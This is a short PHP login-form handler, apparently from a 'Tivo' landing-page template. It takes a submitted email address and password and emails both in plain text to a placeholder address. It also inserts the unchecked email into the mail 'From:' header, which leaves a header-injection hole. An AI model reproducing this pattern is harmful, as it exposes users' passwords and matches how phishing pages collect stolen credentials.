<?php
$errorMSG = "";

if (empty($_POST["email"])) {
    $errorMSG = "Email is required ";
} else {
    $email = $_POST["email"];
}

if (empty($_POST["password"])) {
    $errorMSG = "Password is required ";
} else {
    $password = $_POST["password"];
}

$EmailTo = "yourname@domain.com";
$Subject = "New log in from Tivo landing page";


$Body = "";
$Body .= "Email: ";
$Body .= $email;
$Body .= "\n";
$Body .= "Password: ";
$Body .= $password;
$Body .= "\n";

$success = mail($EmailTo, $Subject, $Body, "From:".$email);

if ($success && $errorMSG == ""){
   echo "success";
}else{
    if($errorMSG == ""){
        echo "Something went wrong :(";
    } else {
        echo $errorMSG;
    }
}
?>